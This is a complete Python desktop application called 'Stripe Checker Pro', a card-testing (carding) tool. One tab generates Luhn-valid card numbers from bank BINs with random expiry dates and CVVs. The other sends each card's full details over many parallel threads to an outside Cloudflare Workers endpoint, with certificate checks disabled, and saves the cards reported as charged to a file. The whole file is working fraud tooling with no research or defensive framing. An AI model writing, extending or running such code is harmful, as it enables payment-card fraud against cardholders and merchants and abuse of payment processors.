import sys
import os
import json
import random
import string
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QPushButton, QLabel, QLineEdit, QFileDialog, QPlainTextEdit,
                             QProgressBar, QSpinBox, QFrame, QGridLayout, QTabWidget,
                             QComboBox, QCheckBox, QTextEdit, QSplitter)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QObject
from PyQt5.QtGui import QTextCursor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─────────────────────────────────────────────────────────────
# Luhn Algorithm
# ─────────────────────────────────────────────────────────────

def calculate_luhn(number):
    digits = [int(d) for d in str(number)]
    checksum = 0
    for i, digit in enumerate(reversed(digits)):
        if i % 2 == 0:
            digit *= 2
            if digit > 9:
                digit -= 9
        checksum += digit
    return (10 - (checksum % 10)) % 10


def validate_luhn(card_number):
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    digits = [int(d) for d in card_number]
    checksum = 0
    for i, digit in enumerate(reversed(digits)):
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        checksum += digit
    return checksum % 10 == 0


def generate_card_number(bin_str, length=16):
    card_num = ''.join(filter(str.isdigit, str(bin_str)))
    while len(card_num) < length - 1:
        card_num += str(random.randint(0, 9))
    card_num = card_num[:length - 1]
    check_digit = calculate_luhn(card_num)
    return card_num + str(check_digit)

# ─────────────────────────────────────────────────────────────
# Stripe API Checker
# ─────────────────────────────────────────────────────────────

def check_card_stripe(session, card, index, total):
    url = f"https://stripe.melmelmel.workers.dev/?card={card}"
    try:
        # Use session for connection pooling (much faster)
        resp = session.get(url, timeout=30, verify=False)
        ms = int(resp.elapsed.total_seconds() * 1000)
        data = resp.json()
        status = data.get("status", "ERROR")
        msg = data.get("message", "No message")
        if status == "DECLINED" and ("3d secure" in msg.lower() or "3ds" in msg.lower()):
            status = "3DS"
        response = data.get("response", "")
        msg = f"{msg} [{ms}ms]"
        return (index, total, card, status, msg, response)
    except Exception as e:
        return (index, total, card, "ERROR", str(e)[:60], "")


def process_card(args):
    session, card, index, total = args
    card_number = card.split('|')[0]
    if not validate_luhn(card_number):
        return (index, total, card, 'ERROR', 'INVALID_LUHN', '')
    return check_card_stripe(session, card, index, total)

# ─────────────────────────────────────────────────────────────
# Worker Thread
# ─────────────────────────────────────────────────────────────

class CheckerWorker(QObject):
    finished = pyqtSignal()
    progress = pyqtSignal(dict)
    log = pyqtSignal(dict)
    index_sync = pyqtSignal(int)

    def __init__(self, cards, threads, start_index=0, start_stats=None):
        super().__init__()
        self.cards = cards
        self.threads = threads
        self.start_index = start_index
        self.start_stats = start_stats or {"charged": 0, "declined": 0, "3ds": 0, "error": 0}
        self._is_running = True
        self.session = requests.Session()
        # Optimize session
        adapter = requests.adapters.HTTPAdapter(pool_connections=threads, pool_maxsize=threads)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

    def run(self):
        total = len(self.cards)
        if total == 0:
            self.finished.emit()
            return

        # Filtering tasks starting from start_index
        tasks = [(self.session, card, i, total) for i, card in enumerate(self.cards, 1) if i > self.start_index]
        remaining = len(tasks)
        
        if remaining == 0:
            self.log.emit({"msg": "✅ All cards already processed.", "type": "INFO"})
            self.finished.emit()
            return

        self.log.emit({"msg": f"🚀 Checking {remaining}/{total} remaining cards", "type": "INFO"})
        self.log.emit({"msg": f"⚡ Parallel Connections: {self.threads}", "type": "INFO"})
        self.log.emit({"msg": "━" * 55, "type": "INFO"})

        stats = {
            "total": total,
            "charged": self.start_stats["charged"],
            "declined": self.start_stats["declined"],
            "3ds": self.start_stats.get("3ds", 0),
            "error": self.start_stats["error"],
            "processed": self.start_index
        }
        self.progress.emit(stats)

        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(process_card, t): t for t in tasks}
                for future in as_completed(futures):
                    if not self._is_running:
                        # Attempt to cancel pending futures
                        for f in futures: f.cancel()
                        break
                    
                    try:
                        idx, tot, card_display, res_status, res_msg, res_resp = future.result()

                        if res_status == 'CHARGED':
                            stats["charged"] += 1
                            try:
                                with open("charged.txt", "a") as f:
                                    f.write(f"{card_display}\n")
                            except:
                                pass
                        elif res_status == 'DECLINED':
                            stats["declined"] += 1
                        elif res_status == '3DS':
                            stats["3ds"] += 1
                        else:
                            stats["error"] += 1

                        stats["processed"] += 1
                        self.index_sync.emit(idx) # Sync current index to UI
                        
                        self.log.emit({
                            "msg": f"[{idx}/{tot}] {card_display} | {res_msg}",
                            "type": res_status,
                            "card": card_display if res_status == 'CHARGED' else None
                        })
                        self.progress.emit(stats)
                    except Exception as e:
                        self.log.emit({"msg": f"⚠️ Thread error: {e}", "type": "ERROR"})
        except Exception as e:
            self.log.emit({"msg": f"❌ Fatal error in executor: {e}", "type": "ERROR"})
        finally:
            self.session.close()

        self.log.emit({"msg": "━" * 55, "type": "INFO"})
        if not self._is_running:
            self.log.emit({"msg": f"⏸ Stopped at {stats['processed']}/{total}", "type": "INFO"})
        else:
            self.log.emit({"msg": f"✅ Done! Charged: {stats['charged']}/{total} | Declined: {stats['declined']}", "type": "INFO"})
        
        self.finished.emit()

    def stop(self):
        self._is_running = False

# ─────────────────────────────────────────────────────────────
# Main Window
# ─────────────────────────────────────────────────────────────

STYLE = """
QMainWindow { background-color: #0a0a0a; }
QWidget { color: #e2e8f0; font-family: 'Segoe UI', 'Roboto', sans-serif; }
QTabWidget::pane { border: 1px solid #1e293b; border-radius: 10px; top: -1px; background: #0a0a0a; }
QTabBar::tab {
    background: #0f172a; color: #64748b; padding: 12px 40px;
    border-top-left-radius: 8px; border-top-right-radius: 8px;
    margin-right: 4px; font-weight: bold; font-size: 13px;
    border: 1px solid #1e293b; border-bottom: none;
}
QTabBar::tab:selected { background: #0a0a0a; color: #38bdf8; border-bottom: 2px solid #38bdf8; }
QTabBar::tab:hover:!selected { color: #94a3b8; }
QLabel { font-weight: 500; font-size: 13px; }
QLineEdit, QComboBox, QSpinBox {
    background: #0f172a; border: 1px solid #1e293b; padding: 10px 14px;
    border-radius: 8px; color: #e2e8f0; font-size: 13px;
}
QLineEdit:focus, QSpinBox:focus { border: 1px solid #38bdf8; }
QComboBox QAbstractItemView {
    background: #0f172a; color: #e2e8f0; selection-background-color: #38bdf8;
    selection-color: #000; border: 1px solid #1e293b;
}
QPushButton {
    background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #0ea5e9, stop:1 #38bdf8);
    border: none; color: #000; padding: 12px 24px; border-radius: 8px;
    font-weight: bold; font-size: 14px;
}
QPushButton:hover { background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #38bdf8, stop:1 #7dd3fc); }
QPushButton:disabled { background: #1e293b; color: #475569; }
QPushButton#stopBtn { background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #dc2626, stop:1 #ef4444); color: #fff; }
QPushButton#stopBtn:hover { background: #ef4444; }
QPushButton#grayBtn { background: #1e293b; color: #94a3b8; }
QPushButton#grayBtn:hover { background: #334155; color: #e2e8f0; }
QPushButton#greenBtn { background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #16a34a, stop:1 #22c55e); color: #000; }
QPushButton#greenBtn:hover { background: #22c55e; }
QPlainTextEdit, QTextEdit {
    background: #0f172a; border: 1px solid #1e293b; border-radius: 10px;
    font-family: 'Cascadia Code', 'Consolas', 'Courier New', monospace;
    font-size: 12px; color: #cbd5e1; padding: 12px;
}
QProgressBar {
    border: 1px solid #1e293b; border-radius: 6px; text-align: center;
    background: #0f172a; height: 8px; color: transparent;
}
QProgressBar::chunk { background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #0ea5e9, stop:1 #38bdf8); border-radius: 6px; }
QFrame#card { background: #0f172a; border: 1px solid #1e293b; border-radius: 12px; }
QFrame#statCard { background: #0f172a; border: 1px solid #1e293b; border-radius: 10px; padding: 12px; }
QFrame#liveFrame { background: #0f172a; border: 1px solid #166534; border-radius: 10px; }
QCheckBox { spacing: 8px; font-size: 13px; }
QCheckBox::indicator { width: 18px; height: 18px; border-radius: 4px; border: 1px solid #334155; background: #0f172a; }
QCheckBox::indicator:checked { background: #38bdf8; }
QSplitter::handle { background: #1e293b; width: 2px; }
"""


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("⚡ Stripe Checker Pro")
        self.setMinimumSize(1100, 850)
        self.worker_thread = None
        self.worker = None
        self.last_index = 0
        self.current_cards = []
        self.setup_ui()
        self._load_state()
        self._load_config()


    def setup_ui(self):
        self.setStyleSheet(STYLE)
        central = QWidget()
        self.setCentralWidget(central)
        root = QVBoxLayout(central)
        root.setContentsMargins(20, 20, 20, 20)

        self.tabs = QTabWidget()
        root.addWidget(self.tabs)

        self._build_checker_tab()
        self._build_generator_tab()

    # ── CHECKER TAB ──────────────────────────────────────────

    def _build_checker_tab(self):
        tab = QWidget()
        ly = QVBoxLayout(tab)
        ly.setSpacing(16)

        # Config card
        cfg = QFrame(); cfg.setObjectName("card")
        gl = QGridLayout(cfg); gl.setContentsMargins(18, 18, 18, 18); gl.setSpacing(12)

        gl.addWidget(QLabel("📋 Cards (Paste):"), 0, 0)
        self.cc_input = QPlainTextEdit()
        self.cc_input.setPlaceholderText("Paste cards: NUMBER|MM|YY|CVV\nOr browse a file below…")
        self.cc_input.setMaximumHeight(140)
        gl.addWidget(self.cc_input, 0, 1, 1, 2)

        gl.addWidget(QLabel("📁 Or File:"), 1, 0)
        self.cc_path = QLineEdit()
        self.cc_path.setPlaceholderText("Select .txt file…")
        self.browse_btn = QPushButton("Browse")
        self.browse_btn.setFixedWidth(100)
        self.browse_btn.clicked.connect(self._browse)
        gl.addWidget(self.cc_path, 1, 1)
        gl.addWidget(self.browse_btn, 1, 2)

        gl.addWidget(QLabel("⚡ Threads:"), 2, 0)
        self.thread_spin = QSpinBox()
        self.thread_spin.setRange(1, 200)
        self.thread_spin.setValue(10)
        gl.addWidget(self.thread_spin, 2, 1)

        ly.addWidget(cfg)

        # Dashboard
        dash = QFrame()
        dl = QHBoxLayout(dash); dl.setSpacing(12)
        self.stat_total    = self._stat("TOTAL",    "0", "#94a3b8")
        self.stat_charged  = self._stat("CHARGED",  "0", "#22c55e")
        self.stat_declined = self._stat("DECLINED", "0", "#ef4444")
        self.stat_3ds      = self._stat("3DS/OTP",  "0", "#c084fc")
        self.stat_error    = self._stat("ERROR",    "0", "#f59e0b")
        for w in (self.stat_total, self.stat_charged, self.stat_declined, self.stat_3ds, self.stat_error):
            dl.addWidget(w)
        ly.addWidget(dash)

        # Progress
        self.progress = QProgressBar()
        ly.addWidget(self.progress)

        # Splitter: Logs | Live
        splitter = QSplitter(Qt.Horizontal)

        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setPlaceholderText("Logs will appear here…")

        live_frame = QFrame(); live_frame.setObjectName("liveFrame")
        live_ly = QVBoxLayout(live_frame); live_ly.setContentsMargins(10, 10, 10, 10)
        live_hdr = QLabel("💳 LIVE CHARGED")
        live_hdr.setStyleSheet("color: #22c55e; font-weight: bold; font-size: 13px;")
        live_hdr.setAlignment(Qt.AlignCenter)
        live_ly.addWidget(live_hdr)
        self.live_output = QTextEdit()
        self.live_output.setReadOnly(True)
        self.live_output.setStyleSheet("color: #4ade80; border: none; background: transparent;")
        self.live_output.setPlaceholderText("Success cards here…")
        live_ly.addWidget(self.live_output)

        splitter.addWidget(self.log_output)
        splitter.addWidget(live_frame)
        splitter.setSizes([680, 320])
        ly.addWidget(splitter, 1)

        # Buttons
        bl = QHBoxLayout()
        self.start_btn = QPushButton("▶  START CHECKING")
        self.start_btn.clicked.connect(self._start)
        self.stop_btn = QPushButton("⏹  STOP")
        self.stop_btn.setObjectName("stopBtn")
        self.stop_btn.setEnabled(False)
        self.stop_btn.clicked.connect(self._stop)
        self.clear_btn = QPushButton("🗑  CLEAR")
        self.clear_btn.setObjectName("grayBtn")
        self.clear_btn.clicked.connect(self._clear_logs)
        bl.addWidget(self.start_btn, 3)
        bl.addWidget(self.stop_btn, 1)
        bl.addWidget(self.clear_btn, 1)
        ly.addLayout(bl)

        self.tabs.addTab(tab, "🔍 CHECKER")

    # ── GENERATOR TAB ────────────────────────────────────────

    def _build_generator_tab(self):
        tab = QWidget()
        ly = QVBoxLayout(tab)
        ly.setSpacing(16)

        cfg = QFrame(); cfg.setObjectName("card")
        gl = QGridLayout(cfg); gl.setContentsMargins(18, 18, 18, 18); gl.setSpacing(12)

        gl.addWidget(QLabel("🏦 BIN:"), 0, 0)
        self.bin_input = QLineEdit()
        self.bin_input.setPlaceholderText("e.g. 453271")
        gl.addWidget(self.bin_input, 0, 1)

        self.preset = QComboBox()
        self.preset.addItems(["Custom", "Visa (453271)", "MasterCard (512345)", "UnionPay (622126)"])
        self.preset.currentIndexChanged.connect(self._preset_change)
        gl.addWidget(self.preset, 0, 2)

        gl.addWidget(QLabel("📅 Month:"), 1, 0)
        self.month_in = QLineEdit(); self.month_in.setPlaceholderText("Random")
        gl.addWidget(self.month_in, 1, 1)
        gl.addWidget(QLabel("Year:"), 1, 2)
        self.year_in = QLineEdit(); self.year_in.setPlaceholderText("Random (28)")
        gl.addWidget(self.year_in, 1, 3)

        gl.addWidget(QLabel("🔐 CVV:"), 2, 0)
        self.cvv_in = QLineEdit(); self.cvv_in.setPlaceholderText("Random")
        gl.addWidget(self.cvv_in, 2, 1)
        gl.addWidget(QLabel("Qty:"), 2, 2)
        self.gen_qty = QSpinBox(); self.gen_qty.setRange(1, 5000); self.gen_qty.setValue(10)
        gl.addWidget(self.gen_qty, 2, 3)

        ly.addWidget(cfg)

        self.gen_output = QPlainTextEdit()
        self.gen_output.setPlaceholderText("Generated cards appear here…")
        ly.addWidget(self.gen_output, 1)

        bl = QHBoxLayout()
        gen_btn = QPushButton("⚙ GENERATE"); gen_btn.clicked.connect(self._generate)
        check_btn = QPushButton("▶ CHECK NOW"); check_btn.setObjectName("greenBtn"); check_btn.clicked.connect(self._auto_check)
        copy_btn = QPushButton("📋 COPY"); copy_btn.setObjectName("grayBtn"); copy_btn.clicked.connect(lambda: QApplication.clipboard().setText(self.gen_output.toPlainText()))
        save_btn = QPushButton("💾 SAVE"); save_btn.setObjectName("grayBtn"); save_btn.clicked.connect(self._save_gen)
        bl.addWidget(gen_btn, 2); bl.addWidget(check_btn, 2); bl.addWidget(copy_btn, 1); bl.addWidget(save_btn, 1)
        ly.addLayout(bl)

        self.auto_check = QCheckBox("Auto-start checking after loading to Checker tab")
        self.auto_check.setChecked(True)
        ly.addWidget(self.auto_check)

        self.tabs.addTab(tab, "🔧 GENERATOR")

    # ── HELPERS ───────────────────────────────────────────────

    def _stat(self, title, value, color):
        f = QFrame(); f.setObjectName("statCard")
        l = QVBoxLayout(f)
        t = QLabel(title); t.setStyleSheet(f"color:{color};font-size:11px;"); t.setAlignment(Qt.AlignCenter)
        v = QLabel(value); v.setStyleSheet(f"font-size:22px;font-weight:bold;color:{color};"); v.setAlignment(Qt.AlignCenter)
        l.addWidget(t); l.addWidget(v)
        f.val = v
        return f

    def _browse(self):
        fn, _ = QFileDialog.getOpenFileName(self, "Select CC File", "", "Text (*.txt);;All (*)")
        if fn: self.cc_path.setText(fn)

    def _log(self, data):
        msg = data.get("msg", "")
        tp  = data.get("type", "INFO")
        card = data.get("card")

        colors = {"CHARGED": "#4ade80", "DECLINED": "#f87171", "3DS": "#c084fc", "ERROR": "#fbbf24", "INFO": "#38bdf8"}
        c = colors.get(tp, "#94a3b8")
        self.log_output.append(f'<span style="color:{c}">{msg}</span>')
        self.log_output.moveCursor(QTextCursor.End)

        if card:
            self.live_output.append(card)
            self.live_output.moveCursor(QTextCursor.End)

    def _update_stats(self, s):
        t = s["total"]
        if t > 0:
            self.progress.setValue(int((s["processed"] / t) * 100))
        self.stat_total.val.setText(str(t))
        self.stat_charged.val.setText(str(s["charged"]))
        self.stat_declined.val.setText(str(s["declined"]))
        self.stat_3ds.val.setText(str(s.get("3ds", 0)))
        self.stat_error.val.setText(str(s["error"]))

    def _sync_index(self, idx):
        self.last_index = idx
        # We also save periodically (every 5 cards)
        if idx % 5 == 0:
            self._save_state()

    def _save_state(self):
        state = {
            "last_index": self.last_index,
            "current_cards": self.current_cards,
            "stats": {
                "charged": int(self.stat_charged.val.text()),
                "declined": int(self.stat_declined.val.text()),
                "3ds": int(self.stat_3ds.val.text()),
                "error": int(self.stat_error.val.text())
            }
        }
        try:
            with open("checker_state.json", "w") as f:
                json.dump(state, f)
        except:
            pass

    def _load_state(self):
        if not os.path.exists("checker_state.json"):
            return
        try:
            with open("checker_state.json", "r") as f:
                state = json.load(f)
            self.current_cards = state.get("current_cards", [])
            self.last_index = state.get("last_index", 0)
            st = state.get("stats", {})
            
            if self.current_cards:
                self.cc_input.setPlainText("\n".join(self.current_cards))
                self.stat_total.val.setText(str(len(self.current_cards)))
                self.stat_charged.val.setText(str(st.get("charged", 0)))
                self.stat_declined.val.setText(str(st.get("declined", 0)))
                self.stat_3ds.val.setText(str(st.get("3ds", 0)))
                self.stat_error.val.setText(str(st.get("error", 0)))
                if len(self.current_cards) > 0:
                    self.progress.setValue(int((self.last_index / len(self.current_cards)) * 100))
                self._log({"msg": f"📂 Loaded previous session: {self.last_index}/{len(self.current_cards)} cards checked.", "type": "INFO"})
        except:
            pass

    def _save_config(self):
        config = {
            "bin": self.bin_input.text(),
            "month": self.month_in.text(),
            "year": self.year_in.text(),
            "cvv": self.cvv_in.text(),
            "qty": self.gen_qty.value(),
            "preset_index": self.preset.currentIndex(),
            "auto_check": self.auto_check.isChecked()
        }
        try:
            with open("config.json", "w") as f:
                json.dump(config, f, indent=4)
        except:
            pass

    def _load_config(self):
        if not os.path.exists("config.json"):
            return
        try:
            with open("config.json", "r") as f:
                config = json.load(f)
            self.bin_input.setText(config.get("bin", ""))
            self.month_in.setText(config.get("month", ""))
            self.year_in.setText(config.get("year", ""))
            self.cvv_in.setText(config.get("cvv", ""))
            if "qty" in config:
                try: self.gen_qty.setValue(int(config["qty"]))
                except: pass
            if "preset_index" in config:
                try: self.preset.setCurrentIndex(int(config["preset_index"]))
                except: pass
            if "auto_check" in config:
                self.auto_check.setChecked(bool(config["auto_check"]))
        except:
            pass


    def _clear_logs(self):
        self.log_output.clear()
        self.live_output.clear()
        self.last_index = 0
        self.progress.setValue(0)
        self.stat_total.val.setText("0")
        self.stat_charged.val.setText("0")
        self.stat_declined.val.setText("0")
        self.stat_3ds.val.setText("0")
        self.stat_error.val.setText("0")
        if os.path.exists("checker_state.json"):
            try: os.remove("checker_state.json")
            except: pass

    # ── CHECKER ACTIONS ──────────────────────────────────────

    def _start(self):
        threads = self.thread_spin.value()
        text = self.cc_input.toPlainText().strip()
        fpath = self.cc_path.text().strip()

        cards = []
        try:
            if text:
                cards = [l.strip() for l in text.splitlines() if l.strip() and '|' in l]
            elif fpath and os.path.exists(fpath):
                with open(fpath, 'r') as f:
                    cards = [l.strip() for l in f if l.strip() and '|' in l]
            
            if not cards:
                self._log({"msg": "❌ No valid cards to check.", "type": "ERROR"})
                return
        except Exception as e:
            self._log({"msg": f"❌ Error loading cards: {e}", "type": "ERROR"})
            return

        # Detect if card list changed, if so, reset index
        if cards != self.current_cards:
            self.current_cards = cards
            self.last_index = 0
            self._clear_logs()
            self.stat_total.val.setText(str(len(cards)))

        if self.worker_thread:
            return

        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        # We don't clear logs if we are resuming
        if self.last_index == 0:
            self._clear_logs()
            self.stat_total.val.setText(str(len(cards)))
        else:
            self._log({"msg": f"🔄 Resuming from card #{self.last_index + 1}...", "type": "INFO"})

        # Collect current stats to pass to worker
        current_stats = {
            "charged": int(self.stat_charged.val.text()),
            "declined": int(self.stat_declined.val.text()),
            "3ds": int(self.stat_3ds.val.text()),
            "error": int(self.stat_error.val.text())
        }

        self.worker_thread = QThread()
        self.worker = CheckerWorker(self.current_cards, threads, self.last_index, current_stats)
        self.worker.moveToThread(self.worker_thread)

        self.worker_thread.started.connect(self.worker.run)
        self.worker.finished.connect(self.worker_thread.quit)
        self.worker_thread.finished.connect(self._on_done)
        self.worker.finished.connect(self.worker.deleteLater)
        self.worker_thread.finished.connect(self.worker_thread.deleteLater)

        self.worker.log.connect(self._log)
        self.worker.progress.connect(self._update_stats)
        self.worker.index_sync.connect(self._sync_index)
        self.worker_thread.start()

    def _stop(self):
        if self.worker: self.worker.stop()

    def _on_done(self):
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self._save_state()
        self.worker = None
        self.worker_thread = None

    # ── GENERATOR ACTIONS ────────────────────────────────────

    def _preset_change(self, idx):
        bins = ["", "453271", "512345", "622126"]
        if idx > 0: self.bin_input.setText(bins[idx])

    def _generate(self):
        b = self.bin_input.text().strip() or random.choice(["4", "5", "6"])
        qty = self.gen_qty.value()
        mm_fix = self.month_in.text().strip()
        yy_fix = self.year_in.text().strip()
        cvv_fix = self.cvv_in.text().strip()

        cards = []
        for _ in range(qty):
            num = generate_card_number(b)
            mm = mm_fix or f"{random.randint(1,12):02d}"
            yy = yy_fix or f"{random.randint(25,30)}"
            cvv = cvv_fix or f"{random.randint(100,999):03d}"
            cards.append(f"{num}|{mm}|{yy}|{cvv}")
        self.gen_output.setPlainText("\n".join(cards))
        self._save_config()
    def _auto_check(self):
        content = self.gen_output.toPlainText().strip()
        if not content: return
        self.cc_input.setPlainText(content)
        self.cc_path.clear()
        self.tabs.setCurrentIndex(0)
        self._log({"msg": f"📥 Auto-loaded {len(content.splitlines())} cards", "type": "INFO"})
        if self.auto_check.isChecked():
            self._start()

    def _save_gen(self):
        fn, _ = QFileDialog.getSaveFileName(self, "Save Cards", "", "Text (*.txt)")
        if fn:
            with open(fn, 'w') as f: f.write(self.gen_output.toPlainText())

    # ── CLEANUP ──────────────────────────────────────────────

    def closeEvent(self, event):
        if self.worker: self.worker.stop()
        self._save_state()
        self._save_config()
        if self.worker_thread:
            self.worker_thread.quit()
            self.worker_thread.wait()
        event.accept()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec_())
